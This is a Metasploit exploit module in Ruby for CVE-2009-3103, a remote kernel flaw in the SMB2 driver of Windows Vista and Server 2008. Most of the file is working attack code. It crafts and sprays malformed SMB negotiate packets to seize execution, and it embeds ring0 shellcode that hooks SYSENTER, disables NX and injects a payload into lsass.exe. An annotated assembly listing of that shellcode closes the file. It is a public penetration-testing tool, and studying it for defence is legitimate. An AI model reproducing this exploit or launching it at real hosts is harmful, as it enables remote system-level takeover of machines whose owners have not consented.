##
# $Id: smb2_negotiate_func_index.rb 7087 2009-09-28 10:54:07Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

        include Msf::Exploit::Remote::SMB

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',
                        'Description'    => %q{
                                This module exploits an out of bounds function table dereference in the SMB
                        request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
                        release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista
                        without SP1 does not seem affected by this flaw.
                        },

                        'Author'         => [ 'laurent.gaffie[at]gmail.com', 'hdm', 'sf' ],
                        'License'        => MSF_LICENSE,
                        'Version'        => '$Revision: 7087 $',
                        'References'     =>
                                [
                                        ['CVE', '2009-3103'],
                                        ['BID', '36299'],
                                        ['OSVDB', '57799'],
                                        ['URL', 'http://seclists.org/fulldisclosure/2009/Sep/0039.html'],
                                        ['URL', 'http://www.microsoft.com/technet/security/advisory/975497.mspx']
                                ],
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'thread',
                                },
                        'Privileged'     => true,
                        'Payload'        =>
                                {
                                        'Space'           => 1024,
                                        'StackAdjustment' => -3500,
                                        'DisableNops'     => true,
                                        'EncoderType'     => Msf::Encoder::Type::Raw,
                                },
                        'Platform'       => 'win',
                        'Targets'        =>
                                [
                                        [ 'Windows Vista SP1/SP2 and Server 2008 (x86)',
                                                {
                                                        'Platform'       => 'win',
                                                        'Arch'           => [ ARCH_X86 ],
                                                        'Ret'            => 0xFFDF0DBC, # "INC ESI; PUSH ESI; RET"
                                                        'ReadAddress'    => 0xFFDF0D04, # A rwx address from kernel space (no nulls in address).
                                                        'ProcessIDHigh'  => 0x0237,     # srv2!SrvScavengerTimer
                                                }
                                        ],
                                ],
                        'DefaultTarget' => 0
                        ))

                register_options( [ Opt::RPORT(445), OptInt.new( 'WAIT', [ true,  "The number of seconds to wait for the attack to complete.", 180 ] ) ], self.class )
        end

        # The payload works as follows:
        # * Our sysenter handler and ring3 stagers are copied over to safe location.
        # * The SYSENTER_EIP_MSR is patched to point to our sysenter handler.
        # * The srv2.sys thread we are in is placed in a halted state.
        # * Upon any ring3 proces issuing a sysenter command our ring0 sysenter handler gets control.
        # * The ring3 return address is modified to force our ring3 stub to be called if certain conditions met.
        # * If NX is enabled we patch the respective page table entry to disable it for the ring3 code.
        # * Control is passed to real sysenter handler, upon the real sysenter handler finishing, sysexit will return to our ring3 stager.
        # * If the ring3 stager is executing in the desired process our sysenter handler is removed and the real ring3 payload called.
        def ring0_x86_payload( opts = {} )

                # The page table entry for StagerAddressUser, used to bypass NX in ring3 on PAE enabled systems (should be static).
                pagetable = opts['StagerAddressPageTable'] || 0xC03FFF00

                # The address in kernel memory where we place our ring0 and ring3 stager (no ASLR).
                kstager   = opts['StagerAddressKernel'] || 0xFFDF0400

                # The address in shared memory (addressable from ring3) where we can find our ring3 stager (no ASLR).
                ustager   = opts['StagerAddressUser'] || 0x7FFE0400

                # Target SYSTEM process to inject ring3 payload into.
                process   = (opts['RunInWin32Process'] || 'lsass.exe').unpack('C*')

                # A simple hash of the process name based on the first 4 wide chars.
                # Assumes process is located at '*:\windows\system32\'. (From Rex::Payloads::Win32::Kernel::Stager)
                checksum  = process[0] + ( process[2] << 8 )  + ( process[1] << 16 ) + ( process[3] << 24 )

                # The ring0 -> ring3 payload blob. Full assembly listing given below.
                r0 =    "\xFC\xFA\xEB\x1E\x5E\x68\x76\x01\x00\x00\x59\x0F\x32\x89\x46\x60" +
                                "\x8B\x7E\x64\x89\xF8\x0F\x30\xB9\x41\x41\x41\x41\xF3\xA4\xFB\xF4" +
                                "\xEB\xFD\xE8\xDD\xFF\xFF\xFF\x6A\x00\x9C\x60\xE8\x00\x00\x00\x00" +
                                "\x58\x8B\x58\x57\x89\x5C\x24\x24\x81\xF9\xDE\xC0\xAD\xDE\x75\x10" +
                                "\x68\x76\x01\x00\x00\x59\x89\xD8\x31\xD2\x0F\x30\x31\xC0\xEB\x34" +
                                "\x8B\x32\x0F\xB6\x1E\x66\x81\xFB\xC3\x00\x75\x28\x8B\x58\x5F\x8D" +
                                "\x5B\x6C\x89\x1A\xB8\x01\x00\x00\x80\x0F\xA2\x81\xE2\x00\x00\x10" +
                                "\x00\x74\x11\xBA\x45\x45\x45\x45\x81\xC2\x04\x00\x00\x00\x81\x22" +
                                "\xFF\xFF\xFF\x7F\x61\x9D\xC3\xFF\xFF\xFF\xFF\x42\x42\x42\x42\x43" +
                                "\x43\x43\x43\x60\x6A\x30\x58\x99\x64\x8B\x18\x39\x53\x0C\x74\x2E" +
                                "\x8B\x43\x10\x8B\x40\x3C\x83\xC0\x28\x8B\x08\x03\x48\x03\x81\xF9" +
                                "\x44\x44\x44\x44\x75\x18\xE8\x0A\x00\x00\x00\xE8\x10\x00\x00\x00" +
                                "\xE9\x09\x00\x00\x00\xB9\xDE\xC0\xAD\xDE\x89\xE2\x0F\x34\x61\xC3"
                # Patch in the required values.
                r0 = r0.gsub( [ 0x41414141 ].pack("V"), [ ( r0.length + payload.encoded.length - 0x1C ) ].pack("V") )
                r0 = r0.gsub( [ 0x42424242 ].pack("V"), [ kstager ].pack("V") )
                r0 = r0.gsub( [ 0x43434343 ].pack("V"), [ ustager ].pack("V") )
                r0 = r0.gsub( [ 0x44444444 ].pack("V"), [ checksum ].pack("V") )
                r0 = r0.gsub( [ 0x45454545 ].pack("V"), [ pagetable ].pack("V") )
                # Return the ring0 -> ring3 payload blob with the real ring3 payload appended.
                return r0 + payload.encoded
        end

        def exploit
                print_status( "Connecting to the target (#{datastore['RHOST']}:#{datastore['RPORT']})..." )
		
		print_status( "Sending the 1st 0x46 packets" )
		x = 0
		while x < 0x46
			connect

			# we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest
			# and srv2!SrvProcPartialCompleteCompoundedRequest
			dialects = [ [ target['ReadAddress'] ].pack("V") * 25, "SMB 2.002" ]

			data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
			data += [ target['ReadAddress']  ].pack("V") * 13
			data += [ 0x00000000 ].pack("V") # Must be NULL's
			data += [ target['ReadAddress']  ].pack("V") * 23
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34
			data += [ 0x42424242 ].pack("V") * 7  # Unused
			data += [ 0x41414141 ].pack("V") * 6  # Unused


			packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
			packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
			packet['Payload']['SMB'].v['Flags1']        = 0x18
			packet['Payload']['SMB'].v['Flags2']        = 0xC853
			packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']
			packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # "JMP DWORD 0x15D" ; jump into our ring0 payload.
			packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...
			packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )
			packet['Payload'].v['Payload']              = data

			packet = packet.to_s
	
			sock.put( packet )
			x = x + 1
			disconnect
		end

		print_status( "Sending the 2nd 0x56 packets" )
		x = 0
		while x < 0x56
			connect

			# we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest
			# and srv2!SrvProcPartialCompleteCompoundedRequest
			dialects = [ [ target['ReadAddress'] ].pack("V") * 25, "SMB 2.002" ]

			data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
			data += [ target['ReadAddress'] + 1 ].pack("V") * 13
			data += [ 0x00000000 ].pack("V") # Must be NULL's
			data += [ target['ReadAddress']  ].pack("V") * 23
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34
			data += [ 0x42424242 ].pack("V") * 7  # Unused
			data += [ 0x41414141 ].pack("V") * 6  # Unused


			packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
			packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
			packet['Payload']['SMB'].v['Flags1']        = 0x18
			packet['Payload']['SMB'].v['Flags2']        = 0xC853
			packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']
			packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # "JMP DWORD 0x15D" ; jump into our ring0 payload.
			packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...
			packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )
			packet['Payload'].v['Payload']              = data

			packet = packet.to_s

			
			sock.put( packet )

			x = x + 1
			disconnect
		end

		print_status( "Sending the 3rd 0xc3 packets" )
		x = 0
		while x < 0xc3
			connect

			# we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest
			# and srv2!SrvProcPartialCompleteCompoundedRequest
			dialects = [ [ target['ReadAddress'] ].pack("V") * 25, "SMB 2.002" ]

			data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
			data += [ target['ReadAddress']  + 2 ].pack("V") * 13
			data += [ 0x00000000 ].pack("V") # Must be NULL's
			data += [ target['ReadAddress']  ].pack("V") * 23
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)
			data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34
			data += [ 0x42424242 ].pack("V") * 7  # Unused
			data += [ 0x41414141 ].pack("V") * 6  # Unused


			packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
			packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
			packet['Payload']['SMB'].v['Flags1']        = 0x18
			packet['Payload']['SMB'].v['Flags2']        = 0xC853
			packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']
			packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # "JMP DWORD 0x15D" ; jump into our ring0 payload.
			packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...
			packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )
			packet['Payload'].v['Payload']              = data

			packet = packet.to_s

			
			sock.put( packet )

			x = x + 1
			disconnect

		end
		connect

                # we use ReadAddress to avoid problems in srv2!SrvProcCompleteRequest
                # and srv2!SrvProcPartialCompleteCompoundedRequest
                dialects = [ [ target['ReadAddress'] + 4].pack("V") * 25, "SMB 2.002" ]

                data  = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
                data += [ 0x00000000 ].pack("V") * 37 # Must be NULL's
                data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34 (known stability issue with srv2!SrvConsumeDataAndComplete2+6b)
                data += [ 0xFFFFFFFF ].pack("V")      # Used in srv2!SrvConsumeDataAndComplete2+0x34
                data += [ 0x42424242 ].pack("V") * 7  # Unused
                data += [ 0x41414141 ].pack("V")      # elite 
                data += [ 0x41414141 ].pack("V") * 6  # Unused
                data += [ target.ret ].pack("V")      # EIP Control thanks to srv2!SrvProcCompleteRequest+0xD2
                data += ring0_x86_payload( target['PayloadOptions'] || {} ) # Our ring0 -> ring3 shellcode

                # We gain code execution by returning into the SMB packet, begining with its header.
                # The SMB packets Magic Header value is 0xFF534D42 which assembles to "CALL DWORD PTR [EBX+0x4D]; INC EDX"
                # This will cause an access violation if executed as we can never set EBX to a valid pointer.
                # To overcome this we force an increment of the header value (via MagicIndex), transforming it to 0x00544D42.
                # This assembles to "ADD BYTE PTR [EBP+ECX*2+0x42], DL" which is fine as ECX will be zero and EBP is a vaild pointer.
                # We patch the Signature1 value to be a jump forward into our shellcode.
                packet = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
                packet['Payload']['SMB'].v['Command']       = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
                packet['Payload']['SMB'].v['Flags1']        = 0x18
                packet['Payload']['SMB'].v['Flags2']        = 0xC853
                packet['Payload']['SMB'].v['ProcessIDHigh'] = target['ProcessIDHigh']
                packet['Payload']['SMB'].v['Signature1']    = 0x0158E900 # "JMP DWORD 0x15D" ; jump into our ring0 payload.
                packet['Payload']['SMB'].v['Signature2']    = 0x00000000 # ...
                packet['Payload']['SMB'].v['MultiplexID']   = rand( 0x10000 )
                packet['Payload'].v['Payload']              = data

                packet = packet.to_s

                print_status( "Sending the exploit packet (#{packet.length} bytes)..." )
                sock.put( packet )

                wtime = datastore['WAIT'].to_i
                print_status( "Waiting up to #{wtime} second#{wtime == 1 ? '' : 's'} for exploit to trigger..." )
                stime = Time.now.to_i


                poke_logins = %W{Guest Administrator}
                poke_logins.each do |login|
                        begin
                                sec = connect(false)
                                sec.login(datastore['SMBName'], login, rand_text_alpha(rand(8)+1), rand_text_alpha(rand(8)+1))
                        rescue ::Exception => e
                                sec.socket.close
                        end
                end

                while( stime + wtime > Time.now.to_i )
                        select(nil, nil, nil, 0.25)
                        break if session_created?
                end

                handler
                disconnect
        end

end

=begin
;===================================================================================
; sf
; Recommended Reading: Kernel-mode Payloads on Windows, 2005, bugcheck & skape.
;                      http://www.uninformed.org/?v=3&a=4&t=sumry
;===================================================================================
[bits 32]
[org 0]
;===================================================================================
ring0_migrate_start:
        cld
        cli
        jmp short ring0_migrate_bounce ; jump to bounce to get ring0_stager_start address
ring0_migrate_patch:
        pop esi                        ; pop off ring0_stager_start address
        ; get current sysenter msr (nt!KiFastCallEntry)
        push 0x176                     ; SYSENTER_EIP_MSR
        pop ecx
        rdmsr
        ; save origional sysenter msr (nt!KiFastCallEntry)
        mov dword [ esi + ( ring0_stager_data - ring0_stager_start ) + 0 ], eax
        ; retrieve the address in kernel memory where we will write the ring0 stager + ring3 code
        mov edi, dword [ esi + ( ring0_stager_data - ring0_stager_start ) + 4 ]
        ; patch sysenter msr to be our stager
        mov eax, edi
        wrmsr
        ; copy over stager to shared memory
        mov ecx, 0x41414141 ; ( ring3_stager - ring0_stager_start + length(ring3_stager) )
        rep     movsb
        sti ; set interrupt flag
        ; Halt this thread to avoid problems.
ring0_migrate_idle:
        hlt
        jmp short ring0_migrate_idle
ring0_migrate_bounce:
        call ring0_migrate_patch ; call the patch code, pushing the ring0_stager_start address to stack
;===================================================================================
; This stager will now get called every time a ring3 process issues a sysenter
ring0_stager_start:
        push byte 0 ; alloc a dword for the patched return address
        pushfd ; save flags and registers
        pushad
        call ring0_stager_eip
ring0_stager_eip:
        pop eax
        ; patch in the real nt!KiFastCallEntry address as our return address
        mov ebx, dword [ eax + ( ring0_stager_data - ring0_stager_eip ) + 0 ]
        mov [ esp + 36 ], ebx
        ; see if we are being told to remove our sysenter hook...
        cmp ecx, 0xDEADC0DE
        jne ring0_stager_hook
        push 0x176 ; SYSENTER_EIP_MSR
        pop ecx
        mov eax, ebx ; set the sysenter msr to be the real nt!KiFastCallEntry address
        xor edx, edx
        wrmsr
        xor eax, eax ; clear eax (the syscall number) so we can continue
        jmp short ring0_stager_finish
ring0_stager_hook:
        ; get the origional r3 return address (edx is the ring3 stack pointer)
        mov esi, [ edx ]
        ; determine if the return is to a "ret" instruction
        movzx ebx, byte [ esi ]
        cmp bx, 0xC3
        ; only insert our ring3 stager hook if we are to return to a single ret (for stability).
        jne short ring0_stager_finish
        ; calculate our r3 address in shared memory
        mov ebx, dword [ eax + ( ring0_stager_data - ring0_stager_eip ) + 8 ]
        lea ebx, [ ebx + ring3_start - ring0_stager_start ]
        ; patch in our r3 stage as the r3 return address
        mov [ edx ], ebx
        ; detect if NX is present (clobbers eax,ebx,ecx,edx)...
        mov eax, 0x80000001
        cpuid
        and edx, 0x00100000 ; bit 20 is the NX bit
        jz short ring0_stager_finish
        ; modify the correct page table entry to make our ring3 stager executable
        mov edx, 0x45454545 ; we default to 0xC03FFF00 this for now (should calculate dynamically).
        add edx, 4
        and dword [ edx ], 0x7FFFFFFF ; clear the NX bit
        ; finish up by returning into the real KiFastCallEntry and then returning into our ring3 code (if hook was set).
ring0_stager_finish:
        popad ; restore registers
        popfd ; restore flags
        ret ; return to real nt!KiFastCallEntry
ring0_stager_data:
        dd 0xFFFFFFFF ; saved nt!KiFastCallEntry
        dd 0x42424242 ; kernel memory address of stager (default to 0xFFDF0400)
        dd 0x43434343 ; shared user memory address of stager (default to 0x7FFE0400)
;===================================================================================
ring3_start:
        pushad
        push byte 0x30
        pop eax
        cdq ; zero edx
        mov ebx, [ fs : eax ] ; get the PEB
        cmp [ ebx + 0xC ], edx
        jz ring3_finish
        mov eax, [ ebx + 0x10 ] ; get pointer to the ProcessParameters (_RTL_USER_PROCESS_PARAMETERS)
        mov eax, [ eax + 0x3C ] ; get the current processes ImagePathName (unicode string)
        add eax, byte 0x28 ; advance past '*:\windows\system32\' (we assume this as we want a system process).
        mov ecx, [ eax ] ; compute a simple hash of the name. get first 2 wide chars of name 'l\x00s\x00'
        add ecx, [ eax + 0x3 ] ; and add '\x00a\x00s'
        cmp ecx, 0x44444444 ; check the hash (default to hash('lsass.exe') == 0x7373616C)
        jne ring3_finish ; if we are not currently in the correct process, return to real caller
        call ring3_cleanup ; otherwise we first remove our ring0 sysenter hook
        call ring3_stager ; and then call the real ring3 payload
        jmp ring3_finish ; should the payload return we can resume this thread correclty.
ring3_cleanup:
        mov ecx, 0xDEADC0DE ; set the magic value for ecx
        mov edx, esp ; save our esp in edx for sysenter
        sysenter ; now sysenter into ring0 to remove the sysenter hook (return to ring3_cleanup's caller).
ring3_finish:
        popad
        ret ; return to the origional system calls caller
;===================================================================================
ring3_stager:
        ; ...ring3 stager here...
;===================================================================================
=end

